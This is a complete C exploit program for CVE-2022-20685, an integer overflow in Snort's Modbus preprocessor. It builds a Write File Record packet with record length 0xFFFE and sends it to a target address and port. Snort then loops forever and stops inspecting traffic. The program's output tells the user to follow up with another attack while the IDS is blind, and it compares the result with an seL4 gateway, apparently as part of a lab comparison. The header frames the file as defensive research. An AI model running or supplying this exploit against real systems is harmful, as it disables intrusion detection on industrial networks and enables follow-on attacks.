/*
 * CVE-2022-20685 Exploit - Snort Modbus Preprocessor Integer Overflow
 *
 * This exploits an integer overflow in Snort's Modbus preprocessor that
 * causes an infinite loop, effectively "blinding" the IDS.
 *
 * Vulnerability Details:
 * - Location: ModbusCheckRequestLengths() in modbus_decode.c
 * - Trigger: Write File Record (function code 0x15) with record_length=0xFFFE
 * - Effect: bytes_processed = 7 + (2 * 0xFFFE) = 0x20003 overflows uint16_t
 *           Result: 0x20003 & 0xFFFF = 3, loop condition always true
 *
 * Affected Versions:
 * - Snort < 2.9.19
 * - Snort 3 < 3.1.11.0
 *
 * Compile: gcc -o cve_20685_attack cve_20685_attack.c
 * Usage:   ./cve_20685_attack <IP> <PORT>
 *
 * For defensive security research only.
 *
 * References:
 * - https://claroty.com/team82/research/blinding-snort-breaking-the-modbus-ot-preprocessor
 * - https://nvd.nist.gov/vuln/detail/CVE-2022-20685
 */

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <stdint.h>
#include <unistd.h>
#include <errno.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <netinet/tcp.h>
#include <arpa/inet.h>

/*
 * Modbus Write File Record (0x15) PDU structure:
 *
 * Byte 0:      Function code (0x15)
 * Byte 1:      Request data length
 * Byte 2:      Reference type (0x06)
 * Bytes 3-4:   File number
 * Bytes 5-6:   Record number
 * Bytes 7-8:   Record length  <-- SET TO 0xFFFE TO TRIGGER OVERFLOW
 * Bytes 9+:    Record data (2 * record_length bytes)
 *
 * The vulnerable code does:
 *   bytes_processed = 7 + (2 * record_length);
 *
 * When record_length = 0xFFFE:
 *   bytes_processed = 7 + (2 * 0xFFFE) = 7 + 0x1FFFC = 0x20003
 *
 * But bytes_processed is uint16_t (max 65535 = 0xFFFF):
 *   0x20003 & 0xFFFF = 0x0003
 *
 * The while loop condition is: bytes_processed < tmp_count
 * Since bytes_processed (3) < tmp_count, loop continues forever!
 */

/* Trigger value that causes integer overflow */
#define TRIGGER_RECORD_LENGTH 0xFFFE

static void print_usage(const char *prog) {
    printf("CVE-2022-20685 Exploit - Snort Modbus Preprocessor DoS\n\n");
    printf("Usage: %s <IP> <PORT>\n\n", prog);
    printf("This exploit causes Snort's Modbus preprocessor to enter an\n");
    printf("infinite loop, effectively blinding the IDS to all attacks.\n\n");
    printf("Examples:\n");
    printf("  %s 127.0.0.1 503     # Attack Snort gateway via Docker\n", prog);
    printf("  %s 192.168.96.20 502 # Attack Snort directly\n", prog);
}

static int tcp_connect(const char *ip, int port) {
    int sock = socket(AF_INET, SOCK_STREAM, 0);
    if (sock < 0) {
        perror("socket");
        return -1;
    }

    struct sockaddr_in addr;
    memset(&addr, 0, sizeof(addr));
    addr.sin_family = AF_INET;
    addr.sin_port = htons(port);

    if (inet_pton(AF_INET, ip, &addr.sin_addr) != 1) {
        fprintf(stderr, "Invalid IP address: %s\n", ip);
        close(sock);
        return -1;
    }

    /* Set connection timeout */
    struct timeval tv = {10, 0};
    setsockopt(sock, SOL_SOCKET, SO_SNDTIMEO, &tv, sizeof(tv));

    if (connect(sock, (struct sockaddr *)&addr, sizeof(addr)) < 0) {
        perror("connect");
        close(sock);
        return -1;
    }

    return sock;
}

static void build_cve_20685_packet(uint8_t *packet, size_t *len) {
    /*
     * MBAP Header (7 bytes) + Write File Record PDU
     */
    size_t idx = 0;

    /* MBAP Header */
    packet[idx++] = 0x00;  /* Transaction ID high */
    packet[idx++] = 0x01;  /* Transaction ID low */
    packet[idx++] = 0x00;  /* Protocol ID high (Modbus) */
    packet[idx++] = 0x00;  /* Protocol ID low */

    /* Length field: Unit ID (1) + PDU length */
    /* PDU = 1 (func) + 1 (data len) + 1 (ref type) + 2 (file#) + 2 (rec#) + 2 (rec len) = 9 */
    uint16_t mbap_length = 1 + 9;
    packet[idx++] = (mbap_length >> 8) & 0xFF;  /* Length high */
    packet[idx++] = mbap_length & 0xFF;         /* Length low */

    packet[idx++] = 0x01;  /* Unit ID */

    /* PDU: Write File Record (Function 0x15) */
    packet[idx++] = 0x15;  /* Function code: Write File Record */

    /* Request data length (remaining bytes in sub-request) */
    packet[idx++] = 0x07;  /* 7 bytes: ref_type(1) + file#(2) + rec#(2) + rec_len(2) */

    /* Sub-request */
    packet[idx++] = 0x06;  /* Reference type (always 0x06 for file records) */

    packet[idx++] = 0x00;  /* File number high */
    packet[idx++] = 0x01;  /* File number low */

    packet[idx++] = 0x00;  /* Record number high */
    packet[idx++] = 0x00;  /* Record number low */

    /* TRIGGER: Record length = 0xFFFE causes integer overflow! */
    packet[idx++] = (TRIGGER_RECORD_LENGTH >> 8) & 0xFF;  /* 0xFF */
    packet[idx++] = TRIGGER_RECORD_LENGTH & 0xFF;         /* 0xFE */

    *len = idx;
}

static void print_packet_analysis(void) {
    printf("\n");
    printf("┌────────────────────────────────────────────────────────────────┐\n");
    printf("│  CVE-2022-20685: Integer Overflow Analysis                     │\n");
    printf("├────────────────────────────────────────────────────────────────┤\n");
    printf("│                                                                │\n");
    printf("│  Vulnerable Code (modbus_decode.c):                            │\n");
    printf("│                                                                │\n");
    printf("│    uint16_t bytes_processed;                                   │\n");
    printf("│    uint16_t record_length;                                     │\n");
    printf("│    ...                                                         │\n");
    printf("│    while (bytes_processed < tmp_count) {                       │\n");
    printf("│        record_length = *(uint16_t*)(payload + offset);         │\n");
    printf("│        bytes_processed = 7 + (2 * record_length);  // BUG!     │\n");
    printf("│    }                                                           │\n");
    printf("│                                                                │\n");
    printf("├────────────────────────────────────────────────────────────────┤\n");
    printf("│                                                                │\n");
    printf("│  Attack: Set record_length = 0x%04X                           │\n", TRIGGER_RECORD_LENGTH);
    printf("│                                                                │\n");
    printf("│  Calculation:                                                  │\n");
    printf("│    bytes_processed = 7 + (2 * 0x%04X)                         │\n", TRIGGER_RECORD_LENGTH);
    printf("│                    = 7 + 0x1FFFC                               │\n");
    printf("│                    = 0x20003                                   │\n");
    printf("│                                                                │\n");
    printf("│  Integer Overflow (uint16_t max = 0xFFFF):                     │\n");
    printf("│    0x20003 & 0xFFFF = 0x0003                                   │\n");
    printf("│                                                                │\n");
    printf("│  Result:                                                       │\n");
    printf("│    bytes_processed = 3                                         │\n");
    printf("│    Loop condition (3 < tmp_count) remains TRUE                 │\n");
    printf("│    → INFINITE LOOP → Snort hangs → IDS BLIND                  │\n");
    printf("│                                                                │\n");
    printf("└────────────────────────────────────────────────────────────────┘\n");
    printf("\n");
}

int main(int argc, char *argv[]) {
    if (argc < 3) {
        print_usage(argv[0]);
        return EXIT_FAILURE;
    }

    const char *target_ip = argv[1];
    int target_port = atoi(argv[2]);

    if (target_port <= 0 || target_port > 65535) {
        fprintf(stderr, "Invalid port: %s\n", argv[2]);
        return EXIT_FAILURE;
    }

    printf("╔════════════════════════════════════════════════════════════════╗\n");
    printf("║  CVE-2022-20685: Snort Modbus Preprocessor Integer Overflow    ║\n");
    printf("║  Affects: Snort < 2.9.19, Snort 3 < 3.1.11.0                   ║\n");
    printf("║  Impact: IDS Denial of Service (Blindness)                     ║\n");
    printf("╚════════════════════════════════════════════════════════════════╝\n");
    printf("\n");
    printf("[*] Target: %s:%d\n", target_ip, target_port);

    print_packet_analysis();

    /* Build exploit packet */
    uint8_t packet[64];
    size_t packet_len;
    build_cve_20685_packet(packet, &packet_len);

    printf("[*] Packet contents (%zu bytes):\n    ", packet_len);
    for (size_t i = 0; i < packet_len; i++) {
        printf("%02X ", packet[i]);
        if ((i + 1) % 16 == 0 && i + 1 < packet_len) printf("\n    ");
    }
    printf("\n\n");

    /* Connect to target */
    printf("[1] Connecting to target...\n");
    int sock = tcp_connect(target_ip, target_port);
    if (sock < 0) {
        return EXIT_FAILURE;
    }
    printf("    Connected!\n\n");

    /* Send exploit */
    printf("[2] Sending CVE-2022-20685 exploit packet...\n");
    ssize_t sent = send(sock, packet, packet_len, 0);
    if (sent < 0) {
        perror("send");
        close(sock);
        return EXIT_FAILURE;
    }
    printf("    Sent %zd bytes!\n\n", sent);

    /* Brief wait */
    usleep(500000);  /* 500ms */

    printf("[3] Exploit delivered.\n\n");

    printf("╔════════════════════════════════════════════════════════════════╗\n");
    printf("║  RESULT                                                        ║\n");
    printf("╠════════════════════════════════════════════════════════════════╣\n");
    printf("║                                                                ║\n");
    printf("║  If Snort is vulnerable (< 2.9.19):                            ║\n");
    printf("║    • Modbus preprocessor is now stuck in infinite loop         ║\n");
    printf("║    • Snort will NOT process any more packets                   ║\n");
    printf("║    • IDS is effectively BLIND to all attacks                   ║\n");
    printf("║                                                                ║\n");
    printf("║  Verify by:                                                    ║\n");
    printf("║    1. Check Snort CPU usage (should be 100%%)                   ║\n");
    printf("║    2. Send CVE-2019-14462 attack - no alert generated          ║\n");
    printf("║    3. Compare with seL4 gateway (still blocking attacks)       ║\n");
    printf("║                                                                ║\n");
    printf("╠════════════════════════════════════════════════════════════════╣\n");
    printf("║  seL4 Gateway Comparison:                                      ║\n");
    printf("║                                                                ║\n");
    printf("║  seL4 is IMMUNE to this attack because:                        ║\n");
    printf("║    • No Modbus preprocessor (no vulnerable code)               ║\n");
    printf("║    • Simple length validation (can't be DoS'd)                 ║\n");
    printf("║    • Protocol-break architecture (TCP terminated)              ║\n");
    printf("║    • Minimal attack surface (~1000 LoC vs ~500k LoC)           ║\n");
    printf("║                                                                ║\n");
    printf("╚════════════════════════════════════════════════════════════════╝\n");

    close(sock);
    return EXIT_SUCCESS;
}
